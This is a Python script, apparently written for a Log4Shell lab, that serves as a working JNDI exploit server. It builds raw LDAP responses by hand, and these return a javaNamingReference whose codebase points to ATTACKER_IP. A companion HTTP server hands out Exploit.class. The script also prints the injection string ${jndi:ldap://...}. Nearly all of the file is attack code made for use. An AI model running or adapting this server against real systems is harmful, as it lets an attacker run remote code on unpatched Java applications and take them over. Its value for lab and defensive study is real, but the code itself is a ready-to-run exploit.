#!/usr/bin/env python3
"""Minimal LDAP server for JNDI exploitation (Log4Shell lab)."""
import socket
import struct
import threading
import http.server
import os
import sys

HTTP_PORT = 8888
LDAP_PORT = 1389
ATTACKER_IP = "172.17.0.1"

def encode_length(length):
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    else:
        return bytes([0x82, (length >> 8) & 0xff, length & 0xff])

def make_tlv(tag, value):
    return bytes([tag]) + encode_length(len(value)) + value

def make_string(s):
    return make_tlv(0x04, s.encode())

def make_enum(val):
    return make_tlv(0x0a, bytes([val]))

def make_int(val):
    return make_tlv(0x02, bytes([val]))

def make_sequence(items):
    data = b''.join(items)
    return make_tlv(0x30, data)

def make_set(items):
    data = b''.join(items)
    return make_tlv(0x31, data)

def make_attribute(name, *values):
    vals = make_set([make_string(v) for v in values])
    return make_sequence([make_string(name), vals])

def handle_ldap_client(conn, addr):
    print(f"[LDAP] Connection from {addr}")
    try:
        data = conn.recv(4096)
        # Send BindResponse (success)
        bind_resp = make_sequence([
            make_int(1),
            make_tlv(0x61, make_enum(0) + make_string("") + make_string(""))
        ])
        conn.sendall(bind_resp)

        data = conn.recv(4096)
        # Send SearchResultEntry with JNDI reference
        codebase = f"http://{ATTACKER_IP}:{HTTP_PORT}/"
        attrs = [
            make_attribute("javaClassName", "Exploit"),
            make_attribute("javaCodeBase", codebase),
            make_attribute("objectClass", "javaNamingReference"),
            make_attribute("javaFactory", "Exploit"),
        ]
        partial_attrs = make_sequence(attrs)
        entry = make_tlv(0x64, make_string("dc=log4shell") + partial_attrs)
        search_entry = make_sequence([make_int(2), entry])
        conn.sendall(search_entry)

        # Send SearchResultDone
        done = make_sequence([
            make_int(2),
            make_tlv(0x65, make_enum(0) + make_string("") + make_string(""))
        ])
        conn.sendall(done)
        print(f"[LDAP] Sent malicious reference -> {codebase}Exploit.class")
    except Exception as e:
        print(f"[LDAP] Error: {e}")
    finally:
        conn.close()


def start_ldap_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", LDAP_PORT))
    s.listen(5)
    print(f"[LDAP] Listening on 0.0.0.0:{LDAP_PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_ldap_client, args=(conn, addr), daemon=True).start()


def start_http_server():
    os.chdir("/tmp/log4shell")
    handler = http.server.SimpleHTTPRequestHandler
    httpd = http.server.HTTPServer(("0.0.0.0", HTTP_PORT), handler)
    print(f"[HTTP] Serving Exploit.class on 0.0.0.0:{HTTP_PORT}")
    httpd.serve_forever()


if __name__ == "__main__":
    threading.Thread(target=start_http_server, daemon=True).start()
    threading.Thread(target=start_ldap_server, daemon=True).start()
    print(f"\n[*] Log4Shell exploit server ready!")
    print(f"[*] Payload: ${{jndi:ldap://{ATTACKER_IP}:{LDAP_PORT}/Exploit}}")
    print(f"[*] Press Ctrl+C to stop\n")
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        print("\n[*] Shutting down")
